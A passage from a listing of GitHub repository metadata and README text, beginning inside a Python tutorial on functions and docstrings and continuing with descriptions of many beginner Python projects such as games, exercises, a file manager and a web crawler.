number raised to power of second number                  Takes number_one and raises it to the power of number_two, returning the result.         """"""                  return number_one ** number_two ...  >>> number_to_the_power_of(3,3) 27 A mis-match between parameters and arguments will raise an error: >>> number_to_the_power_of(4,) ... Traceback (most recent call last):   File ""<stdin>"", line 1, in <module> TypeError: number_to_the_power_of() missing 1 required positional argument: 'number_two' Adding a default value for a parameter can defend against such errors: >>> def number_to_the_power_of_default(number_one, number_two=2):         """"""Raise a number to an arbitrary power.                  :param number_one: int the base number.         :param number_two: int the power to raise the base number to.         :return: int - number raised to power of second number                  Takes number_one and raises it to the power of number_two, returning the result.         """"""          return number_one ** number_two  ... >>> number_to_the_power_of_default(4) 16 Methods bound to class names are invoked via dot notation (.), as are functions, constants, or global names imported as part of a module.: import string  # This is a constant provided by the *string* module. >>> print(string.ascii_lowercase) ""abcdefghijklmnopqrstuvwxyz""  # This is a method call of the str *class*. >>> start_text = ""my silly sentence for examples."" >>> str.upper(start_text) ""MY SILLY SENTENCE FOR EXAMPLES.""  # This is a method call of an *instance* of the str *class*. >>> start_text.upper() ""MY SILLY SENTENCE FOR EXAMPLES."" Comments in Python start with a # that is not part of a string, and end at line termination. Unlike many other programming languages, Python does not support multi-line comment marks. Each line of a comment block must start with the # character. Comments are ignored by the interpreter: # This is a single line comment.  x = ""foo""  # This is an in-line comment.  # This is a multi-line # comment block over multiple lines -- # these should be used sparingly. The first statement of a function body can optionally be a docstring, which concisely summarizes the function or object's purpose. Docstrings are read by automated documentation tools and are returned by calling .__doc__ on the function, method, or class name. They can also function as lightweight unit tests, which will be covered in a later exercise. They are recommended for programs of any size where documentation is needed, and their conventions are laid out in PEP257: # An example on a user-defined function. >>> def number_to_the_power_of(number_one, number_two):         """"""Raise a number to an arbitrary power.                  :param number_one: int the base number.         :param number_two: int the power to raise the base number to.         :return: int - number raised to power of second number                  Takes number_one and raises it to the power of number_two, returning the result.         """"""          return number_one ** number_two ...  >>> print(number_to_the_power_of.__doc__) Returns float or int.         Takes number_one and raises it to the power of number_two, returning the result.  # __doc__() for the built-in type: str. >>> print(str.__doc__) str(object='') -> str str(bytes_or_buffer[, encoding[, errors]]) -> str  Create a new string object from the given object. If encoding or errors is specified, then the object must expose a data buffer that will be decoded using the given encoding and error handler. Otherwise, returns the result of object.__str__() (if defined) or repr(object). encoding defaults to sys.getdefaultencoding(). errors defaults to 'strict'. Instructions You're going to write some code to help you cook a gorgeous lasagna from your favorite cookbook. You have five tasks, all related to cooking your recipe. 1. Define expected bake time in minutes Define an EXPECTED_BAKE_TIME constant that returns how many minutes the lasagna should bake in the oven. According to your cookbook, the Lasagna should be in the oven for 40 minutes: >>> lasagna.EXPECTED_BAKE_TIME 40 2. Calculate remaining bake time in minutes Implement the bake_time_remaining() function that takes the actual minutes the lasagna has been in the oven as an argument and returns how many minutes the lasagna still needs to bake based on the EXPECTED_BAKE_TIME. >>> bake_time_remaining(30) 10 3. Calculate preparation time in minutes Implement the preparation_time_in_minutes() function that takes the number of layers you want to add to the lasagna as an argument and returns how many minutes you would spend making them. Assume each layer takes 2 minutes to prepare. >>> preparation_time_in_minutes(2) 4 4. Calculate total elapsed cooking time (prep + bake) in minutes Implement the elapsed_time_in_minutes() function that has two parameters: number_of_layers (the number of layers added to the lasagna) and elapsed_bake_time (the number of minutes the lasagna has been baking in the oven). This function should return the total number of minutes you've been cooking, or the sum of your preparation time and the time the lasagna has already spent baking in the oven. >>> elapsed_time_in_minutes(3, 20) 26 5. Update the recipe with notes Go back through the recipe, adding notes and documentation. def elapsed_time_in_minutes(number_of_layers, elapsed_bake_time):     """"""     Return elapsed cooking time.      This function takes two numbers representing the number of layers & the time already spent      baking and calculates the total elapsed minutes spent cooking the lasagna.     """""" Source Created by  @BethanyG  "
417910576;School_District_Analysis;https://github.com/DeepaFrancis/School_District_Analysis;Jupyter Notebook;2021-10-16T18:14:09Z;0;0;0;School_District_Analysis Pandas Python, Jupyter 
417916985;tutorial-pybr;https://github.com/valbertovc/tutorial-pybr;Python;2021-10-16T18:42:59Z;0;0;0;tutorial-pybr Tutorial Python Brasil 2021 
417909656;tutorial-pybr;https://github.com/denisfrm/tutorial-pybr;Python;2021-10-16T18:09:55Z;0;0;0;tutorial-pybr Tutorial Python Brasil 2021 
417916874;tutorial-pybr;https://github.com/wischutz/tutorial-pybr;Python;2021-10-16T18:42:29Z;0;0;0;tutorial-pybr Tutorial Python Brasil 2021 
417967846;Pomodoro;https://github.com/enzo-souza/Pomodoro;;2021-10-16T22:59:03Z;0;0;0;Pomodoro Pomodoro timer in python 
417931968;noscope;https://github.com/theradius/noscope;Python;2021-10-16T19:51:27Z;0;0;0;noscope A tool for taking snapshots of a Python stack frame. All names in a scope can be saved and loaded with minimal syntax. Useful in debugging, recursive breakpointing, moving state between Python processes and general testing. Installation pip install noscope Usage import noscope foo = 123 noscope.save() del foo noscope.load() print(foo) 
417916436;tutorial-pybr;https://github.com/kleytonls/tutorial-pybr;Python;2021-10-16T18:40:20Z;0;0;0;tutorial-pybr Tutorial Python Brasil 2021 
417916831;tutorial-pybr;https://github.com/jferreira23/tutorial-pybr;Python;2021-10-16T18:42:15Z;0;0;0;tutorial-pybr Tutorial Python Brasil 2021 
417972884;FizzBuzzBazzPractice;https://github.com/Rubi-Vera/FizzBuzzBazzPractice;Python;2021-10-16T23:34:11Z;0;0;0;Fizz Buzz Variation This python practice is a variation on the classic Fizz Buzz coding challenge. The challenge is as follows Each number in an entered sequence must be replaced with a combination of these in the order as shown below: Fizz: if number at current position is divisible by 3 Buzz: if number at current position is divisible by 5 Bazz: if number at current position is divisible by 7 Fizzy: if number at current position is divisible by and contains the number 3 Buzzy: if number at current position is divisible by and contains the number 5 Upper case all words: if the number shows a combination of the above 3 or more rules The number: if none of these applies Deployment I expect to be able to pull your code from github and run the following: docker build . -t fizz docker run fizz I should then be prompted by the following Please give me a number: After I type in the number into the prompt it will look like this Please give me a number: 33,44,91,7,2 after I press enter to submit my input, it will then print out the result like below FizzFizzy$44$91$Bazz$2 This practice project was given to me by Marc Streeter. 
417972079;data_structures;https://github.com/MakensonNoel/data_structures;Python;2021-10-16T23:28:35Z;0;0;0;data_structures Data Structures in Python 
417954418;register-login-project;https://github.com/JoaoCalheiros/register-login-project;Python;2021-10-16T21:37:53Z;0;0;0;
417879823;Quiz;https://github.com/kindssoul/Quiz;Python;2021-10-16T16:10:43Z;1;1;0;
417969365;Hangman;https://github.com/faceyage/Hangman;Python;2021-10-16T23:08:39Z;0;0;0;Hangman Game With Python A simple hangman game I made for improve myself Works by selecting random words or sentences from words.txt 
417883758;calculator;https://github.com/Amannitkkr/calculator;Python;2021-10-16T16:26:06Z;0;0;0;calculator calculator using python module kivy 
417954534;Jogo-da-Forca;https://github.com/igor19402/Jogo-da-Forca;Python;2021-10-16T21:38:27Z;0;0;0;
417916864;project_api_rest;https://github.com/jr1os/project_api_rest;;2021-10-16T18:42:25Z;0;0;0;project_api_rest api rest python fastapi 
417954479;leetcode;https://github.com/jaspreet-singh-chadha/leetcode;Python;2021-10-16T21:38:08Z;0;0;0;leetcode Python Leetcode answers 
417947732;LogsAPI;https://github.com/Refaltor77/LogsAPI;Python;2021-10-16T21:02:58Z;0;0;0;LogsAPI LogsAPI in python installation pip install simple-chalk How to use from logs import *  print(info('Waw !')) print(warn('Waw !')) print(debug('Waw !')) print(error('Waw !')) print(critical('Waw !'))  
417965941;tdd-book;https://github.com/d4daveshep/tdd-book;Python;2021-10-16T22:45:36Z;0;0;0;Download latest geckodriver and install to /usr/local/bin Install github CLI gh following instructions from Github.org Set up virtualenv aptitude install python3-venv cd tdd-book python3 -m venv virtualenv Activate the virtualenv with source virtualenv/bin/activate Python requirements.txt file needs django & selenium Inside virtualenv... pip3 install -r requirements.txt 
417917008;CodeAcademy;https://github.com/apophenia42/CodeAcademy;Python;2021-10-16T18:43:05Z;0;0;0;
417916859;tutorial-pybr;https://github.com/agathafr/tutorial-pybr;;2021-10-16T18:42:23Z;0;0;0;tutorial-pybr Tutorial Python Brasil 2021 
417916839;tutorial-pybr;https://github.com/cassiobotaro/tutorial-pybr;Python;2021-10-16T18:42:16Z;1;1;0;tutorial-pybr Tutorial Python Brasil 2021 
417925444;Python-de-cero-a-Deep-Learning;https://github.com/SemQuinoa/Python-de-cero-a-Deep-Learning;;2021-10-16T19:21:51Z;0;0;0;Deep_Learning-Grupo_de_estudio Repositorio de cuadernos de Colaboratory sobre Deep Learning 
417920453;Rock-Paper-Scissors-Game-in-Python;https://github.com/Purvil026/Rock-Paper-Scissors-Game-in-Python;Python;2021-10-16T18:59:45Z;0;0;0;
417908743;Class5-Python-Module-Week6;https://github.com/pycoders-nl/Class5-Python-Module-Week6;;2021-10-16T18:06:19Z;0;0;1;"Class5-Python-Module-Week6 1. Bank Project In this project you will have 3 files:  bank.py client.py main.py  bank.py  You will have class Bank. This bank will have instance variable name and class variable clients list. Initially this list will be empty. This class will have method add_client method which appends the client to list And lastly this class will have authentication method which takes name and account_number as parameters and authenticates the client  client.py  You will have class Client inside this file. Class Client will have account dictionary as the class variable. This dictionary will keep following info: ""account_number, name, total_amount"" __init__ method will initialize this variables, it will take name and total_amount as params and will assign a random 5 digit int to account_number Lastly this class will have withdraw, deposit and balance methods.  main.py  This class initially will create a bank object with a name you choose and then will print the following menu (it should print this menu, until user says exit) [hint: use while loop]:  Welcome to International Bank!  Choose an option:      1. Open new bank account     2. Open existing bank account     3. Exit  Then it will take the user input:  If it is 1, create an account First ask the name and then the deposit amount to user:  To create an account, please fill in the information below. Name:  Deposit amount:   After this, it creates the account and prints the menu again Account created successfully! Your account number is:  88194  Choose an option:      1. Open new bank account     2. Open existing bank account     3. Exit   If it is 2, asks following info  To access your account, please enter your credentials below. Name: Account Number:  First asks name and then account number. If credentials are wrong, print following, and then print the menu again: Authentication failed! Reason: account not found.  If credentials are correct, prints the following menu: Authentication successful!  Welcome irem!  Choose an option:      1. Withdraw     2. Deposit     3. Balance     4. Exit  And according to user input you can withdraw, deposit money. Or see the current balance. If input is 1, asks for withdraw amount: Withdraw amount:  And according to user input witdraws the amout and prints the menu again. The sum of 100 has been withdrawn from your account balance.  Your current account balance is: 900  If input is 2, asks for deposit amount: Deposit amount:  And according to user input, in this case 300. Prints following:  The sum of 300 has been added to your account balance.  Your current account balance is: 1200  If input is 3, shows the current balance: Your current account balance is: 1200   If input is 4, it goes back to other menu.  And lastly, in the main menu, if user input is 3: close the program  1.2. UML Draw Use Case and Class Diagrams for this project. 2. UML Class Diagram Consider the code in file uml_class.py. Draw the UML Class Diagram corresponding to the Python code. You may assume the code compiles, all imports are taken care of, and all classes reside in the same package. 3. UML Use Case Diagram Draw the UML Use Case Diagram for the followig scenario: As a lecturer at a university, I am able to manage my exams and register the grades.  For both these actions, I should always login first with my credentials, followed by a confirmation via an SMS code.  When I am registering new exam results, I must confirm this action again when my session is older than five minutes.  When I want to manage my exam, I can choose to either change its date or room.  Hackerrank Questions   sWAP cASE: https://www.hackerrank.com/challenges/swap-case/problem   String Split and Join: https://www.hackerrank.com/challenges/python-string-split-and-join/problem   Mutations: https://www.hackerrank.com/challenges/python-mutations/problem   Text Wrap: https://www.hackerrank.com/challenges/text-wrap/problem   "
417952458;Aulas_Banco_de_Dados_com_Python;https://github.com/phmartinsconsult/Aulas_Banco_de_Dados_com_Python;Python;2021-10-16T21:27:13Z;0;0;0;Aulas_Banco_de_Dados_com_Python Aulas Banco de Dados com Python 
417968724;get-python-version-jupyter-VsPTYe;https://github.com/tryspidy/get-python-version-jupyter-VsPTYe;Python;2021-10-16T23:04:22Z;0;0;0;
417965732;CS50-Python-LabsAndProbSets;https://github.com/YuriCodes/CS50-Python-LabsAndProbSets;Python;2021-10-16T22:44:10Z;0;0;0;
417924901;termux-python-matlab-scipy-numpy-opencv;https://github.com/sdp4377/termux-python-matlab-scipy-numpy-opencv;;2021-10-16T19:19:20Z;0;0;0;termux-python-matlab-scipy-numpy-opencv To install all required packages for open-cv , numpy , scipy , scikit-learnig .... in Termux #termux 
417930686;Python_tehetseggondozo_hazi_2021_10_11;https://github.com/Konlll/Python_tehetseggondozo_hazi_2021_10_11;Python;2021-10-16T19:45:39Z;0;0;0;
417949146;Server-client-base-on-TCP-with-python;https://github.com/anewday1999/Server-client-base-on-TCP-with-python;Python;2021-10-16T21:10:39Z;0;0;0;
417891314;Exploratary-data-analysis-in-python-on-zomato-;https://github.com/Jaiswar1232/Exploratary-data-analysis-in-python-on-zomato-;Jupyter Notebook;2021-10-16T16:57:43Z;0;0;0;Exploratary-data-analysis-in-python-on-zomato- 
417907590;Content-based-Recommender-Systems-in-python;https://github.com/yasser-nizamli/Content-based-Recommender-Systems-in-python;;2021-10-16T18:01:40Z;0;0;0;Content-based-Recommender-Systems-in-python 
417958127;selenium-webdriver-tutorial-python-K1DGFN;https://github.com/tryspidy/selenium-webdriver-tutorial-python-K1DGFN;Python;2021-10-16T21:58:01Z;0;0;0;
417924828;IntroToPythonForDataScience;https://github.com/ro1406/IntroToPythonForDataScience;Jupyter Notebook;2021-10-16T19:18:56Z;0;0;0;IntroToPythonForDataScience Repo to share all the code taught in the Intro To Python For Data Science workshop for STA301 - Introduction to Data Science course for AUS. All code by Rohan Mitra. Workshops taught to Sophomore, Junior and Senior students enrolled in the STA301 course. 
417895421;Using-Buzzer-Raspberrypi-gpiozeroLibrary-Python;https://github.com/SyedaAnshrahGillani/Using-Buzzer-Raspberrypi-gpiozeroLibrary-Python;Python;2021-10-16T17:13:30Z;0;0;0;
417913293;files_manager;https://github.com/Palinody/files_manager;Python;2021-10-16T18:26:15Z;0;0;0;"TODO  Move the parsed files to dest (with keep structure option?)  --move <dest>  Prune all the empty directories. If --move option enabled, move before prune in case the destination folder is empty and within the scope of --prune targets.  --prune  make better filters  --filter <timestamp> < timestamp < <timestamp> --filter timestamp < <timestamp> --filter timestamp > <timestamp> --filter <size> < size <G|M|K|B> < <size> --filter size <G|M|K|B> < <size> --filter size <G|M|K|B> > <size>  make action options trigger confirmation prompt. Add -y option.  Tutorial  Directory tree example  <root directory> ├── empty_dir ├── file_0 ├── file_1 ├── file_2 ├── folder_0 │   ├── file_3 │   ├── file_4 │   ├── file_5 │   ├── file_6 │   ├── folder_0 │   │   └── folder_0 │   │       ├── file_7 │   │       ├── file_8 │   │       ├── folder_0 │   │       │   ├── file_10 │   │       │   ├── file_11 │   │       │   └── file_12 │   │       ├── folder_1 │   │       └── folder_2 │   │           └── file_9 │   ├── folder_1 │   │   ├── folder_0 │   │   │   ├── file_14 │   │   │   ├── file_15 │   │   │   ├── file_17 │   │   │   └── file_18 │   │   └── folder_1 │   │       ├── file_19 │   │       └── file_20 │   └── folder_2 │       └── file_13 ├── folder_1 │   └── front_center └── folder2     └── file_21  Define root directory  $ python3 files_manager.py --root /path/to/root/directory This command will silently construct the parse tree   To visualise the tree parser, use the cmd --verbose or -V  $ python3 files_manager.py --root /path/to/root/directory --verbose The resulting tree will parse only the files Path:  /path/to/root/directory          SIZE (byte)     DATE       TIME     PATH          226,948,380     09-03-2021 16:46:13 file_1          161,836,709     26-02-2021 09:27:38 file_2          361,543,919     14-10-2021 08:07:51 file_0  To parse the directories recursively use --recursion or -r  $ python3 files_manager.py --root /path/to/root/directory -V -r Path:  /path/to/root/directory          SIZE (byte)     DATE       TIME     PATH          226,948,380     09-03-2021 16:46:13 file_1          161,836,709     26-02-2021 09:27:38 file_2          361,543,919     14-10-2021 08:07:51 file_0  Path:  /path/to/root/directory/folder2          SIZE (byte)     DATE       TIME     PATH          674,644,297     05-10-2021 08:39:22 file_21  Path:  /path/to/root/directory/folder_0          SIZE (byte)     DATE       TIME     PATH          176,797,703     10-03-2021 08:51:21 file_6          146,947,693     21-05-2021 10:18:46 file_5          175,991,234     10-03-2021 08:49:25 file_3          173,711,458     10-03-2021 08:48:54 file_4  Path:  /path/to/root/directory/folder_0/folder_1/folder_1          SIZE (byte)     DATE       TIME     PATH          129,131,325     21-05-2021 13:51:23 file_20          146,947,693     21-05-2021 13:44:18 file_19  Path:  /path/to/root/directory/folder_0/folder_1/folder_0          SIZE (byte)     DATE       TIME     PATH          1,170,405,832   12-03-2021 14:01:16 file_14          1,644,261,352   10-05-2021 13:03:26 file_15          2,155,620,073   12-03-2021 14:03:28 file_17          1,288,557,762   12-03-2021 12:31:56 file_18  Path:  /path/to/root/directory/folder_0/folder_0/folder_0          SIZE (byte)     DATE       TIME     PATH          2,697           21-05-2021 13:44:35 file_7          58,223,158      21-05-2021 13:44:35 file_8  Path:  /path/to/root/directory/folder_0/folder_0/folder_0/folder_0          SIZE (byte)     DATE       TIME     PATH          1,236,016,848   21-05-2021 13:50:20 file_10          119,965,643     21-05-2021 13:50:50 file_12          1,056,284,105   21-05-2021 13:55:51 file_11  Path:  /path/to/root/directory/folder_0/folder_0/folder_0/folder_2          SIZE (byte)     DATE       TIME     PATH          121,736,117     21-05-2021 13:56:22 file_9  Path:  /path/to/root/directory/folder_0/folder_2          SIZE (byte)     DATE       TIME     PATH          119,965,643     21-05-2021 10:46:29 file_13  To sort the visualisation of the tree by date or by file size: --sort size, --sort date, --sort rSize, --sort rDate. The 2 first options sort in increasing order and the 2 last in reversed/decreasing order.  $ python3 files_manager.py --root /path/to/root/directory -V -r --sort date The --sort command has no influence on the tree and only modifies how it is presented in the console. SIZE (byte)     DATE       TIME     PATH 161,836,709     26-02-2021 09:27:38 /path/to/root/directory/file_2 226,948,380     09-03-2021 16:46:13 /path/to/root/directory/file_1 173,711,458     10-03-2021 08:48:54 /path/to/root/directory/folder_0/file_4 175,991,234     10-03-2021 08:49:25 /path/to/root/directory/folder_0/file_3 176,797,703     10-03-2021 08:51:21 /path/to/root/directory/folder_0/file_6 1,288,557,762   12-03-2021 12:31:56 /path/to/root/directory/folder_0/folder_1/folder_0/file_18 1,170,405,832   12-03-2021 14:01:16 /path/to/root/directory/folder_0/folder_1/folder_0/file_14 2,155,620,073   12-03-2021 14:03:28 /path/to/root/directory/folder_0/folder_1/folder_0/file_17 1,644,261,352   10-05-2021 13:03:26 /path/to/root/directory/folder_0/folder_1/folder_0/file_15 146,947,693     21-05-2021 10:18:46 /path/to/root/directory/folder_0/file_5 119,965,643     21-05-2021 10:46:29 /path/to/root/directory/folder_0/folder_2/file_13 146,947,693     21-05-2021 13:44:18 /path/to/root/directory/folder_0/folder_1/folder_1/file_19 58,223,158      21-05-2021 13:44:35 /path/to/root/directory/folder_0/folder_0/folder_0/file_8 2,697           21-05-2021 13:44:35 /path/to/root/directory/folder_0/folder_0/folder_0/file_7 1,236,016,848   21-05-2021 13:50:20 /path/to/root/directory/folder_0/folder_0/folder_0/folder_0/file_10 119,965,643     21-05-2021 13:50:50 /path/to/root/directory/folder_0/folder_0/folder_0/folder_0/file_12 129,131,325     21-05-2021 13:51:23 /path/to/root/directory/folder_0/folder_1/folder_1/file_20 1,056,284,105   21-05-2021 13:55:51 /path/to/root/directory/folder_0/folder_0/folder_0/folder_0/file_11 121,736,117     21-05-2021 13:56:22 /path/to/root/directory/folder_0/folder_0/folder_0/folder_2/file_9 674,644,297     05-10-2021 08:39:22 /path/to/root/directory/folder2/file_21 361,543,919     14-10-2021 08:07:51 /path/to/root/directory/file_0  The tree can be filtered using the --filter option by date or by file size with rules. There are currently 2 rules:  File size filtering: <comparator> <integer> <file size unit> Timestamp filtering: <comparator> <timestamp> comparator: ""lt"" or ""gt"" meaning ""less than"" and ""greater than"" respectively. file size unit: ""G"" or ""M"" or ""K"" meaning gigabyte, megabyte and kilobyte respectively timestamp: ""DD_MM_YYYY"" or ""DD_MM_YYYY:hh_mm_ss"" Example python3 files_manager.py --root /path/to/root/directory -V -r --sort date --filter gt 21_05_2021:13_44_18 The above tree becomes: SIZE (byte)     DATE       TIME     PATH 146,947,693     21-05-2021 13:44:18 /path/to/root/directory/folder_0/folder_1/folder_1/file_19 58,223,158      21-05-2021 13:44:35 /path/to/root/directory/folder_0/folder_0/folder_0/file_8 2,697           21-05-2021 13:44:35 /path/to/root/directory/folder_0/folder_0/folder_0/file_7 1,236,016,848   21-05-2021 13:50:20 /path/to/root/directory/folder_0/folder_0/folder_0/folder_0/file_10 119,965,643     21-05-2021 13:50:50 /path/to/root/directory/folder_0/folder_0/folder_0/folder_0/file_12 129,131,325     21-05-2021 13:51:23 /path/to/root/directory/folder_0/folder_1/folder_1/file_20 1,056,284,105   21-05-2021 13:55:51 /path/to/root/directory/folder_0/folder_0/folder_0/folder_0/file_11 121,736,117     21-05-2021 13:56:22 /path/to/root/directory/folder_0/folder_0/folder_0/folder_2/file_9 674,644,297     05-10-2021 08:39:22 /path/to/root/directory/folder2/file_21 361,543,919     14-10-2021 08:07:51 /path/to/root/directory/file_0  Finally, to remove all the files that are shown after applying all the filters, use --remove  python3 files_manager.py --root /path/to/root/directory -V -r --sort date --filter gt 21_05_2021:13_44_18 --remove Of course, you can remove the files directly using the rule without outputing in the console. Though, it's safer to visualise the tree first. python3 files_manager.py --root /path/to/root/directory -r --filter gt 21_05_2021:13_44_18 --remove "
417939635;Local_Telegram_Neoluxe_bot;https://github.com/Neoluxer/Local_Telegram_Neoluxe_bot;HTML;2021-10-16T20:23:38Z;0;0;0;
417926352;hello;https://github.com/Ragib15/hello;;2021-10-16T19:25:27Z;0;0;0;
417891331;bdt;https://github.com/mortyre/bdt;Python;2021-10-16T16:57:48Z;0;0;0;
417913388;tutorial-pybr;https://github.com/rayssa-amorim/tutorial-pybr;;2021-10-16T18:26:42Z;0;0;0;tutorial-pybr Tutorial Python Brasil 2021 
417898027;beginners-ptyhon-programs;https://github.com/cs0408/beginners-ptyhon-programs;;2021-10-16T17:23:35Z;0;0;0;
417933142;DataFrameIntro;https://github.com/Gobz1994/DataFrameIntro;Jupyter Notebook;2021-10-16T19:55:26Z;1;1;0;
417969156;firstApp;https://github.com/enigmaBil/firstApp;;2021-10-16T23:07:07Z;0;0;0;
417877737;data-scripts;https://github.com/yesdeepakmittal/data-scripts;Python;2021-10-16T16:03:23Z;0;0;0;Python Data Scripts    Other     NEWS Scrapper Automatic Email   Send Email Using Python    
417891096;password-generator-;https://github.com/klarvy/password-generator-;Python;2021-10-16T16:56:44Z;0;0;0;password-generator- Генератор паролей написанный на Python 
417915458;Unit6_homework;https://github.com/rkp678/Unit6_homework;;2021-10-16T18:35:43Z;0;0;0;Unit6_homework Unit 6 Homework - Pythonic Monopoly 
417936928;pyfestival;https://github.com/DariuszOkonski/pyfestival;HTML;2021-10-16T20:10:58Z;0;0;0;pyfestival the best python meetup ever 
417899817;djangoproject;https://github.com/jkaalexkei/djangoproject;HTML;2021-10-16T17:30:24Z;0;0;0;
417935284;election-analysis;https://github.com/kimconrad/election-analysis;;2021-10-16T20:03:57Z;0;0;0;election-analysis Module 3: PyPoll with Python 
417878146;Advance-Task-3;https://github.com/Devil-Rick/Advance-Task-3;Python;2021-10-16T16:04:46Z;0;0;0;
417973337;firstflaskApp;https://github.com/enigmaBil/firstflaskApp;Python;2021-10-16T23:37:40Z;0;0;0;
417974099;micropython-PyBR2021;https://github.com/lugabiel/micropython-PyBR2021;Python;2021-10-16T23:43:19Z;0;0;0;"Python para microcontroladores com MicroPyhton micropython-PyBR2021 Repositório de exemplos para tutorial ""Python para microcontroladores com MicroPython"" na Python Brasil 2021 #PyBR2021 "
417961196;tdd-pybr2021;https://github.com/gcrsaldanha/tdd-pybr2021;;2021-10-16T22:14:37Z;0;0;0;tdd-pybr2021 Tutorial de TDD com Python e Django apresentado na Python Brasil 2021 
417899838;sample_testing_an_application;https://github.com/saprykins/sample_testing_an_application;Python;2021-10-16T17:30:28Z;0;0;0;
417960125;ICS3U-Unit5-4-Python-Cylinder;https://github.com/sydneykuhn/ICS3U-Unit5-4-Python-Cylinder;;2021-10-16T22:08:04Z;0;0;0;ICS3U-Unit5-4-Python-Cylinder 
417922313;ICS3U-Assignment-6-Python-Volume_of_Sphere;https://github.com/Rodas-Nega1/ICS3U-Assignment-6-Python-Volume_of_Sphere;Python;2021-10-16T19:07:56Z;0;0;0;ICS3U-Assignment-6-Python-Volume_of_Sphere  
417914089;Words-that-start-with-a-Letter-in-a-file--Python;https://github.com/chill2711/Words-that-start-with-a-Letter-in-a-file--Python;Python;2021-10-16T18:29:36Z;0;0;0;Words-that-start-with-a-Letter-in-a-file--Python This program will take the contents of a file, and search for a word that starts with a specific letter given from the user. 
417885796;PassingList-as-an-Argument-in-a-Function-Python;https://github.com/SyedaAnshrahGillani/PassingList-as-an-Argument-in-a-Function-Python;Python;2021-10-16T16:34:15Z;1;1;0;
417968678;abs;https://github.com/selym3/abs;Python;2021-10-16T23:04:02Z;0;0;0;abs python solver for absolute value expressions designed to work mostly with nested absolute values of polynomial expressions this is an experimental project I made to see if I could get python to do my precalculus hw features  represent standard polynomials find roots up to second order represent piecewise functions break standard polynomials in absolute values into piecewise functions  todo  parse polynomials from string clean code to make expressions easier to build make sure piecewise, polynomial, and term are polymorphic find roots to some higher order polynomials  bugs  second order expressions with abs not working  
417929647;Phyton;https://github.com/thais9/Phyton;;2021-10-16T19:40:33Z;0;0;0;Phyton https://wiki.python.org.br/ListaDeExercicios 
417883999;newweb;https://github.com/Esther2007/newweb;;2021-10-16T16:27:04Z;0;0;0;
417895626;Covid_19_Analysis;https://github.com/riya4jha/Covid_19_Analysis;Jupyter Notebook;2021-10-16T17:14:22Z;0;0;0;Covid_19_Analysis Covid 19 Data Analysis Project Using Python 
417937363;cuber;https://github.com/lolc0w/cuber;Python;2021-10-16T20:13:02Z;0;0;0;cuber Assult Cube Memory Editing with Python 
417900595;artcoding;https://github.com/paulgaryphillips/artcoding;;2021-10-16T17:33:26Z;0;0;0;
417894217;Covid_Data_Analysis;https://github.com/riya4jha/Covid_Data_Analysis;;2021-10-16T17:08:39Z;0;0;0;Covid_Data_Analysis Covid - 19 Data Analysis Project Using Python 
417913263;pong_game;https://github.com/NoFakMiha/pong_game;Python;2021-10-16T18:26:08Z;0;0;0;
417886694;voices;https://github.com/athenas2021/voices;Python;2021-10-16T16:37:55Z;0;0;0;voices Testing voice synthesizer / voice recognition - Python 
417955273;Brick;https://github.com/HalfQuark/Brick;Python;2021-10-16T21:42:37Z;0;0;0;"Brick Very rudimentary programming language interpreted in python Has a Stack and a 0-indexed dynamic size ""Memory"" Array. It is also case sensitive. Multiple commands can be on the same line separated by \ Commands:  Expression: Pushes the value as an int, float or string on top of the stack SET: Pops the first and second elements from the Stack and stores the second element in the Memory at the index specified by the first element GET: Pops the first element from the Stack and pushes the value in the Memory at the index specified by this element on top of the stack POP: Pops the first element from the Stack IN: Waits for an input and pushes it on top of the Stack OUT: Pops the first element from the Stack and prints it GOTO: Pops the first element from the Stack and goes to the 1-indexed line specified by its value END: Terminates the program Operators + - * /: Pops the first and second elements from the Stack and pushes the result of the operation on top of the stack Comparisons < > =: Pops the first and second elements from the Stack and if the condition evaluates to false skips to the next line DEBUG: Prints the Stack and Memory  "
417886608;Simulation_of_physical_processes;https://github.com/nalsur-veallam/Simulation_of_physical_processes;C++;2021-10-16T16:37:36Z;0;0;0;
417954623;WebScrapper;https://github.com/luizgasc/WebScrapper;Python;2021-10-16T21:38:58Z;0;0;0;
417918824;aws-samples;https://github.com/mdprewitt/aws-samples;Python;2021-10-16T18:51:29Z;0;0;0;aws-samples Sample Python Code for AWS services 
417931852;scaffold;https://github.com/Merihun/scaffold;;2021-10-16T19:51:06Z;0;0;0;scaffold This is a project scaffold for Python 
417882252;Bolbot;https://github.com/marquito29/Bolbot;;2021-10-16T16:20:16Z;0;0;0;Bolbot Python binance futures BOT with Bollinger strategy 
417884574;webpage;https://github.com/Esther2007/webpage;;2021-10-16T16:29:33Z;0;0;0;
417910192;Student-management-portal;https://github.com/Gbdj8989/Student-management-portal;;2021-10-16T18:12:26Z;0;0;0;
417972172;tidbits;https://github.com/Jeenix/tidbits;Python;2021-10-16T23:29:03Z;0;0;0;
417966877;number_of_details;https://github.com/fiskov/number_of_details;Python;2021-10-16T22:52:09Z;0;0;0;Number of details with Python OpenCV This project get estimate the number of details in the photo. Every detail has a round hole.  Software  Python 3.9.7 numpy 1.21.2 (install with pip install numpy) opencv-python 4.5.3.56 (install with pip install opencv-python)  Runnin Use string with parameters python calcDetails.py images/img1.jpg Result of execution  
417921250;PokeApi;https://github.com/LuisAntonioLinaresCarbajal/PokeApi;Python;2021-10-16T19:03:02Z;1;1;0;PokeApi Has tu primera PokeApi en  python 
417952072;Dictionary;https://github.com/evaris237/Dictionary;Python;2021-10-16T21:25:03Z;1;1;0;
417886309;Colaris;https://github.com/Colaris327/Colaris;;2021-10-16T16:36:25Z;0;0;0;Colaris Trying hard to learn C and python. Most of my codes are simple. Hope that I can make a project one day. 
417952029;json;https://github.com/Kim2507/json;;2021-10-16T21:24:50Z;0;0;0;
417954533;streamlit_investor_dashboard;https://github.com/hamzarabi3/streamlit_investor_dashboard;;2021-10-16T21:38:27Z;0;0;0;streamlit_investor_dashboard Building an option trading dashboard with Python 
417879225;hello;https://github.com/lasowskasylwia/hello;HTML;2021-10-16T16:08:32Z;0;0;0;
417975009;web-crawler;https://github.com/CWan677/web-crawler;;2021-10-16T23:50:14Z;0;0;0;"web-crawler A multi threaded web crawler in Python How to install Install dependencies using the following commands(for Windows): 	python -m pip install url_normalize 	python -m pip install bs4  	python -m pip install heapdict 	python -m pip install fake_useragent 	python -m pip install google-search 	python -m pip install google  Execute script using the following command(for Windows): 	python main.py  For Mac and Linux, replace ""python"" with ""python3"" when executing commands  "
417892345;aiopokeapi.py;https://github.com/im-mde/aiopokeapi.py;Python;2021-10-16T17:01:32Z;0;0;0;aiopokeapi.py Asynchronous Python wrapper for the PokeApi. 
